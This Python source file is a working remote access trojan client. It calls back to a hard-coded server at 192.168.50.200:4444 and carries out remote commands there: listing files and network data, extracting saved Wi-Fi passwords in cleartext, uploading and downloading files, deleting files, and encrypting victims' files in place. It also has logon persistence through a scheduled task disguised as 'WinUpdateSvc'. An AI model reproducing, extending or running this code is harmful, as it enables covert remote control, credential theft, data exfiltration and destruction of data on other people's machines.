import os
import sys
import time
import socket
import ctypes
import subprocess
from cryptography.fernet import Fernet
import platform
import random



# ------------------ Encryption ------------------

key = Fernet.generate_key()
cipher = Fernet(key)

def encrypt(data: bytes) -> bytes:
    return cipher.encrypt(data)

def decrypt(data: bytes) -> bytes:
    return cipher.decrypt(data)

def to_chunks(data: bytes, chunk_size: int = 1024):
    return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

# ------------------ Smart sleep ------------------
def smart_sleep():
    delay = random.randint(20, 40)
    print(f"[*] Sleeping for {delay} seconds...")
    time.sleep(delay)

# ------------------ Registry Persistence ------------------

def create_persistent_task(task_name="WinUpdateSvc"):

    exe_path = sys.executable


    ps_command = f'''
    $Action = New-ScheduledTaskAction -Execute '{exe_path}'
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Highest
    $Task = New-ScheduledTask -Action $Action -Principal $Principal -Trigger $Trigger
    Register-ScheduledTask -TaskName "{task_name}" -InputObject $Task -Force
    '''

    try:

        result = subprocess.run(["powershell", "-Command", ps_command],
                                capture_output=True, text=True)
        if result.returncode == 0:
            print("✅ Task created successfully.")
        else:
            print("❌ Failed to create task:\n", result.stderr)
    except Exception as e:
        print(f"⚠️ Error running PowerShell: {e}")

def remove_task(task_name="WinUpdateSvc"):
    try:
        result = subprocess.run(
            f'schtasks /delete /tn "{task_name}" /f',
            shell=True, capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f"❌ Error removing task: {e}")
# ------------------ Wallpaper Control ------------------

def change_wallpaper(image_path: str) -> bytes:
    if not os.path.exists(image_path):
        return encrypt(b"Image not found")
    
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 0)
    return encrypt(b"Wallpaper changed")

def predict_operating_system():
    os_name=platform.system()
    return os_name


# ------------------ Client Handler ------------------

class ClientHandler:
    def __init__(self, connection: socket.socket):
        self.connection = connection

    def send(self, data: bytes):
        self.connection.sendall(data)

    def recv(self, size: int = 1024) -> bytes:
        return self.connection.recv(size)
    
    def download(self,filename):
        file_size = int(decrypt(self.recv(1024)).decode())
        # print(file_size)
        block_size = 1024
        num_blocks = file_size // block_size
        remaining_bytes = file_size % block_size
        with open(f'{filename}','wb') as file:
            # full_data = b''
            chunk_number = 1
            for i in range(num_blocks):    
                data = self.connection.recv(1024)
                # full_data += data
                file.write(data)
                # print(f"chunk {chunk_number} received.", end='\r',flush=True)
                chunk_number += 1
            data = self.connection.recv(remaining_bytes)
            # full_data += data
            # print("\nLast Chunk received")
            # file.write(full_data)
            file.write(data)
            file.close()
            # print("\nFile received successfully.")
        
    def upload(self,filename):
        current_path =  os.path.abspath(os.getcwd())
        file_path = os.path.join(current_path,filename)
        file_size_upload = str(os.path.getsize(file_path))
        self.send(encrypt(file_size_upload.encode()))
        # print(file_size_upload)
        time.sleep(0.2)
        block_size = 1024
        num_blocks = int(file_size_upload) // block_size
        remaining_bytes = int(file_size_upload) % block_size
        with open(filename, 'rb') as file:
            chunk_number = 1
            for i in range(num_blocks):
                data_chunk = file.read(1024)
                self.send(data_chunk)
                # print(f"Chunk {chunk_number} sent.", end='\r',flush=True)
                chunk_number += 1
                time.sleep(0.05)
            data_chunk = file.read(remaining_bytes)
            self.send(data_chunk)
            # print("\nLast chunk sent")
            file.close()
            # print("\nFile sent successfully.")

    def encrypt_file(self , filename):
        current_path =  os.path.abspath(os.getcwd())
        file_path = os.path.join(current_path,filename)
        try:
            with open(file_path,"rb") as file:
                data = file.read()
            file.close()
            data = encrypt(data)
            with open(file_path,"wb") as file:
                file.write(data)
            file.close()
            self.send(encrypt(b"File encrypted successfully"))
        except Exception as e:
            self.send(encrypt(f"Error encrypting file: {e}".encode()))
    
    def decrypt_file(self , filename):
        current_path =  os.path.abspath(os.getcwd())
        file_path = os.path.join(current_path,filename)
        try:
            with open(file_path,"rb") as file:
                data = file.read()
            file.close()
            data = decrypt(data)
            with open(file_path,"wb") as file:
                file.write(data)
            file.close()
            self.send(encrypt(b"File decrypted successfully"))
        except Exception as e:
            self.send(encrypt(f"Error decrypting file: {e}".encode()))
                

    def authenticate(self, valid_user="test", valid_pass="test") -> bool:
        logged_in = False
        counter = 0
        while not logged_in:
            self.send(encrypt(b"Username: "))
            username = decrypt(self.recv()).decode().strip()
            self.send(encrypt(b"Password: "))
            password = decrypt(self.recv()).decode().strip()

            if username == valid_user and password == valid_pass:
                self.send(encrypt(b"Authentication successful"))
                logged_in = True
                return True
            elif counter <2:
                counter += 1
                self.send(encrypt(f"Wrong credentials ,you have {3-counter} more tries".encode()))
            else:
                self.send(encrypt(b"Authentication failed"))
                return False

    def send_data(self, data: bytes):
        encrypted = encrypt(data)
        chunks = to_chunks(encrypted)
        self.send(encrypt(str(len(chunks)).encode()))
        time.sleep(1)
        for chunk in chunks:
            self.send(chunk)
            time.sleep(0.02)


    def handle_commands(self,os_name):
        while True:
            try:
                cmd = decrypt(self.recv()).decode()
                print(f"[Received] {cmd}")
                if cmd == "close":
                    self.connection.close()
                    sys.exit()

                elif cmd == "dir":
                    if os_name=="Windows":
                        result = subprocess.run("dir", shell=True, capture_output=True, text=True).stdout
                    else:
                        result = subprocess.run("ls -ltrh", shell=True, capture_output=True, text=True).stdout
                    self.send_data(result.encode())

                elif cmd == "path":
                    if os_name=="Windows":
                        current = os.path.abspath(os.getcwd())
                        self.send_data(current.encode())
                    else:
                        result = subprocess.run("pwd", shell=True, capture_output=True, text=True).stdout
                        self.send_data(result.encode())

                elif cmd == "ipconfig":
                    if os_name=="Windows":
                        result = subprocess.run("ipconfig", shell=True, capture_output=True, text=True).stdout
                    else:
                        result = subprocess.run("ip a", shell=True, capture_output=True, text=True).stdout
                    self.send_data(result.encode())

                elif cmd == "arp -a":
                    result = subprocess.run("arp -a", shell=True, capture_output=True, text=True).stdout
                    self.send_data(result.encode())
                
                elif cmd == "wifi-networks":
                    if os_name=="Windows":
                        result = subprocess.run("netsh wlan show profile", shell=True, capture_output=True, text=True).stdout
                    else:
                        result = "Still unavailable on linux"
                    self.send_data(result.encode())
                
                elif cmd == "hostname":
                    if os_name=="Windows":
                        result = subprocess.run("systeminfo", shell=True, capture_output=True, text=True).stdout
                    else:
                        result = subprocess.run("hostnamectl", shell=True, capture_output=True, text=True).stdout
                    self.send_data(result.encode())
                
                elif cmd.startswith("wifi-password "):
                    wifi_network = cmd.split(" ",1)[1]
                    command = f'netsh wlan show profile "{wifi_network}" key=clear'
                    if os_name=="Windows":
                        result = subprocess.run(command, shell=True, capture_output=True, text=True).stdout
                    else:
                        command = f"sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | grep -i '{wifi_network}'"
                        try:
                            result = subprocess.run(command, shell=True, capture_output=True, text=True).stdout
                            if not result:
                                result = f"No password found for network: {wifi_network}"
                        except:
                            result = "Failed to retrieve WiFi password. May need sudo privileges."
                    self.send_data(result.encode())                    

                elif cmd.startswith("del "):
                    filename = cmd.split(" ", 1)[1]
                    try:
                        os.remove(os.path.join(os.getcwd(), filename))
                        self.send(encrypt(b"File deleted"))
                    except:
                        self.send(encrypt(b"Deletion failed"))

                elif cmd.startswith("cd "):
                    directory = cmd.split(" ", 1)[1]
                    try:
                        os.chdir(directory)
                        current = os.path.abspath(os.getcwd())
                        self.send(encrypt(b"1"))
                        time.sleep(0.5)
                        self.send(encrypt(f"Changed to {current}".encode()))
                    except:
                        self.send(encrypt(b"Directory change failed"))

                elif cmd.startswith("download "):
                    file_name = decrypt(self.recv()).decode()
                    self.upload(file_name)


                elif cmd.startswith("upload "):
                    file_name = decrypt(self.recv()).decode()
                    self.download(file_name)

                elif cmd.startswith("wall "):
                    if os_name=="Windows":
                        filename = cmd.split(" ", 1)[1]
                        result = change_wallpaper(os.path.join(os.getcwd(), filename))
                        self.send(encrypt(b"1"))
                        self.send(result)
                    else:
                        try:
                            filename = cmd.split(" ", 1)[1]
                            filepath = os.path.join(os.getcwd(), filename)
                            command = f"gsettings set org.gnome.desktop.background picture-uri file://{filepath}"
                            result = subprocess.run(command, shell=True, capture_output=True, text=True)
                            if result.returncode == 0:
                                self.send(encrypt(b"1"))
                                self.send(encrypt(b"Wallpaper changed successfully"))
                            else:
                                self.send(encrypt(b"1")) 
                                self.send(encrypt(b"Failed to change wallpaper - command failed"))
                        except Exception as e:
                            self.send(encrypt(b"1"))
                            self.send(encrypt(f"Failed to change wallpaper: {str(e)}".encode()))
                
                elif cmd.startswith("encrypt "):
                    file_name = decrypt(self.recv()).decode()
                    self.encrypt_file(file_name)        

                elif cmd.startswith("decrypt "):
                    file_name = decrypt(self.recv()).decode()
                    self.decrypt_file(file_name)          

                else:
                    self.send(encrypt(b"1"))
                    self.send(encrypt(b"Unknown command"))

            except Exception as e:
                self.send(encrypt(f"Error: {e}".encode()))
                print(f"[Error] {e}")
                break

# ------------------ Main Server ------------------

def Connect_to_server():
    operating_system = predict_operating_system()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        while 1:
            try:
                sock.connect(("192.168.50.200",4444))
                print("[*] Connected to server ...    ")
                time.sleep(1)
                sock.sendall(key)
                time.sleep(1)
                sock.sendall(operating_system.encode())
                client = ClientHandler(sock)
                if client.authenticate():
                    client.handle_commands(operating_system)
                else:
                    print("Authentication Error")
                client.connection.close()
                return
            except Exception:
                timer = 20
                print("Server is not up yet. Trying again in")
                for i in range(timer,0,-1):
                    print(f"{i} seconds ", end="\r",flush=True)
                    time.sleep(1)

if __name__ == "__main__":
    #create_persistent_task()
    #remove_task()
    Connect_to_server()